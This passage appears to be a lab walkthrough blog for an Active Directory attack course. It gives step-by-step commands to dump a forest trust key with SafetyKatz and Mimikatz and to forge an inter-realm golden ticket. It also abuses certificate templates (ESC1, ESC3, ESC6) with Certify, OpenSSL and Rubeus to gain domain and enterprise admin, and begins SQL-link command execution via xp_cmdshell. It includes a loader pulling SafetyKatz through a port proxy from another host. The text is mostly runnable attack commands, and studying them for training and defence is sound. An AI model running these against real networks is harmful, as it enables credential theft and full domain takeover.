</pre><td class="rouge-code"><pre><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dcorp-dc\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">

</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">

</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">172.16</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">20</span><span class="w">

</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">

</span><span class="n">lsadump::trust</span><span class="w"> </span><span class="nx">/patch</span><span class="w">
</span></pre></table></code></div></div><p>Then run the below command from an elevated command prompt using the rc4 hash extracted earlier to create the ticket</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:163373571e6c3e09673010fd60accdf0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust_forest_tkt.kirbi"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></pre></table></code></div></div><p>Then use the ticket with Rubeus</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/ticket:C:\AD\Tools\trust_forest_tkt.kirbi</span><span class="w"> </span><span class="nx">/service:cifs/eurocorp-dc.eurocorp.local</span><span class="w"> </span><span class="nx">/dc:eurocorp-dc.eurocorp.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>and check if we have access using</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">dir</span><span class="w"> </span><span class="nx">\\eurocorp-dc.eurocorp.local\SharedwithDCorp\</span><span class="w">
</span></pre></table></code></div></div><h4 id="using-invoke-mimikatz-and-old-kekeo"><span class="mr-2">Using Invoke-Mimikatz and old Kekeo</span><a href="#using-invoke-mimikatz-and-old-kekeo" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>With DA privileges from earlier, run the following command to retrieve the trust key for the trust between dollarcorp and eurocorp</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::trust /patch"'</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">dcorp-dc.dollarcorp.moneycorp.local</span><span class="w">
</span></pre></table></code></div></div><p>Create the inter-realm TGT</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /rc4:163373571e6c3e09673010fd60accdf0 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'</span><span class="w">
</span></pre></table></code></div></div><p>then use asktgs in the kekeo_old directory as such</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\asktgs.exe</span><span class="w"> </span><span class="nx">C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi</span><span class="w"> </span><span class="nx">CIFS/eurocorp-dc.eurocorp.local</span><span class="w">
</span></pre></table></code></div></div><p>Present the TGS to the CIFS service</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">.</span><span class="n">\kirbikator.exe</span><span class="w"> </span><span class="nx">lsa</span><span class="w"> </span><span class="o">.</span><span class="nx">\CIFS.eurocorp-dc.eurocorp.local.kirbi</span><span class="w">
</span></pre></table></code></div></div><p>and check if we have access with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">ls</span><span class="w"> </span><span class="nx">\\eurocorp-dc.eurocorp.local\SharedwithDCorp\</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-21"><span class="mr-2">Learning Objective 21</span><a href="#learning-objective-21" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Check if AD CS is used by the target forest and find any vulnerable or abusable templates, if so then abuse the template to escalate to DA and EA. We can use Certify.exe to check for AD CS in moneycorp.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">cas</span><span class="w">
</span></pre></table></code></div></div><p>Then we can list all the templates using the “find” command</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">

</span><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/enrolleeSuppliesSubject</span><span class="w">
</span></pre></table></code></div></div><p>We see the HTTPSCertificates looks interesting, as the msPKI-Certificates-Name-Flag is <code class="language-plaintext highlighter-rouge">Enrollee_Supplies_Subject</code> and the enrollment rights contains dcorp/RDPUsers, which we know our student is a member of this group. This means we can request a certificate for any user as the student, we’ll use the below command to request a certificate for a domain admin.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:</span><span class="s2">"HTTPSCertificates"</span><span class="w"> </span><span class="nx">/altname:administrator</span><span class="w">
</span></pre></table></code></div></div><p>Copy all the text between —–BEGIN RSA PRIVATE KEY—– and —–ENDCERTIFICATE—– and save it to esc1.pem. We need to convert it to PFC to use it. We can use the openssl binary on our student VM to do that.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc1.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc1-DA.pfx</span><span class="w">
</span></pre></table></code></div></div><p>and enter a password when prompted. Then we can use rubeus to request a TGT for DA administrator.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/certificate:esc1-DA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Check if we have DA privileges</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></pre></table></code></div></div><p>cool, we can use a similar method to escalate to EA, by requesting a certificate for the EA account</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:</span><span class="s2">"HTTPSCertificates"</span><span class="w"> </span><span class="nx">/altname:moneycorp.local\administrator</span><span class="w">
</span></pre></table></code></div></div><p>And do the same thing shown earlier to extract the key and convert it to PFX</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc1-EA.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc1-EA.pfx</span><span class="w">
</span></pre></table></code></div></div><p>Use Rubeus again to request TGT for EA.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:moneycorp.local\Administrator</span><span class="w"> </span><span class="nx">/dc:mcorp-dc.moneycorp.local</span><span class="w"> </span><span class="nx">/certificate:esc1-EA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>and check our access with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">mcorp-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></pre></table></code></div></div><h4 id="privilege-escalation-to-da-and-ea-using-esc3"><span class="mr-2">Privilege Escalation to DA and EA using ESC3</span><a href="#privilege-escalation-to-da-and-ea-using-esc3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>If we list vulnerable templates in moneycorp using this command:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/vulnerable</span><span class="w">
</span></pre></table></code></div></div><p>We can see that the SmartCardEnrollment-Agent template has EKU for Certificate Request Agents, and grants enrollment rights to domain users. If we can find another template that has an EKU that allows for domain authentication and has application policy requirement of the certificate request agent, we can request certs on behalf of any user. use the find command again and look for application policies with the certificate request agent. In this case SmartCardEnrollment-Users has enrollment rights for dcorp\Domain Users.</p><p>We can request an enrollment agent certificate from the template “SmartCardEnrollment-Agent”</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:SmartCardEnrollment-Agent</span><span class="w">
</span></pre></table></code></div></div><p>And like earlier, save the certificate to esc3.pem and convert it to pfx and set a password for it.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc3.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc3-agent.pfx</span><span class="w">
</span></pre></table></code></div></div><p>Then we can use the Enrollment Agent Certificate to request a certificate for DA from the template SmartCardEnrollment-Users</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:SmartCardEnrollment-Users</span><span class="w"> </span><span class="nx">/onbehalfof:dcorp\administrator</span><span class="w"> </span><span class="nx">/enrollcert:C:\AD\Tools\esc3-agent.pfx</span><span class="w"> </span><span class="nx">/enrollcertpw:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w">
</span></pre></table></code></div></div><p>Once again, save this cert as esc3-DA.pem and convert it to pfx.</p><p>``powershell C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc3-DA.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export -out C:\AD\Tools\esc3-DA.pfx</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>
And use the esc3-DA.pfx created above with Rubeus and request a TGT for DA

```powershell
C:\AD\Tools\Rubeus.exe asktgt /user:administrator /certificate:esc3-DA.pfx /password:SecretPass@123 /ptt
</pre></table></code></div></div><p>Check if we have DA with</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></pre></table></code></div></div><p>To escalate to Enterprise Admin, we just need to change the request to SmartCardEnrollment-Users template with Rubeus. Note that we are using ‘/onbehalfof: mcorp\administrator’ here</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:SmartCardEnrollment-Users</span><span class="w"> </span><span class="nx">/onbehalfof:mcorp\administrator</span><span class="w"> </span><span class="nx">/enrollcert:C:\AD\Tools\esc3-agent.pfx</span><span class="w"> </span><span class="nx">/enrollcertpw:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w">
</span></pre></table></code></div></div><p>Once more, convert it to esc3-EA.pfx using openssl and use rubeus</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc3-EA.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\esc3-EA.pfx</span><span class="w">

</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:moneycorp.local\administrator</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\esc3-EA.pfx</span><span class="w"> </span><span class="nx">/dc:mcorp-dc.moneycorp.local</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></pre></table></code></div></div><p>Then access mcorp-dc</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">mcorp-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></pre></table></code></div></div><h4 id="privilege-escalation-to-da-and-ea-using-esc6"><span class="mr-2">Privilege escalation to DA and EA using ESC6</span><a href="#privilege-escalation-to-da-and-ea-using-esc6" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">cas</span><span class="w">
</span></pre></table></code></div></div><p>And we are looking for</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>[!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can
specify Subject Alternative Names!
</pre></table></code></div></div><p>This means we can request a certificate for ANY user from a template that will allow enrollment for normal or low-priv users.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">
</span></pre></table></code></div></div><p>And we see again the RDPUsers have Enrollment Rights in the CA-Integration template. As a member of the RDPUsers group, we can request a certificate for any user using CA-Integration template. for EA, use <code class="language-plaintext highlighter-rouge">/altname:moneycorp.local\administrator</code>, and for DA use the below command</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:mcorpdc.moneycorp.local\moneycorp-MCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:</span><span class="s2">"CA-Integration"</span><span class="w"> </span><span class="nx">/altname:administrator</span><span class="w">
</span></pre></table></code></div></div><p>Save it to esc6-DA and convert it to pfx using OpenSSL, then use rubeus once again to request a TGT for DA</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:administrator</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\esc6-DA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">

</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dcorp-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></pre></table></code></div></div><h3 id="learning-objective-22"><span class="mr-2">Learning Objective 22</span><a href="#learning-objective-22" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In this objective we get a reverse shell on the SQL server in eurocorp forest by abusing database links from dcorp-mssql. We start with enumerating SQL servers in the domain and see if our student account has privileges to connect to any of them. We can use the PowerUpSQL module as shown below after starting invisishell:</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\PowerUpSQL-master\PowerupSQL.psd1</span><span class="w">

</span><span class="n">Get-SQLInstanceDomain</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Get-SQLServerinfo</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>We can then use Get-SQLServerLinkCrawl for crawling database links automatically.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">dcorp-mssql.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></pre></table></code></div></div><p>If XP_cmdshell is enabled, it is possible to execute commands on eu-sql using linked databases.</p><div class="language-powershell highlighter-rouge"><div class="code-header"> <span data-label-text="Powershell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">Get-SQLServerLinkCrawl</span><span class="w"> </span><span class="nt">-Instance</span><span class="w"> </span><span class="nx">dcorp-mssql.dollarcorp.moneycorp.local</span><span class="w"> </span><span class="nt">-Query</span><span class="w"> </span><span class="s2">"exec master..xp_cmdshell 'whoami'"</span><span class="w">
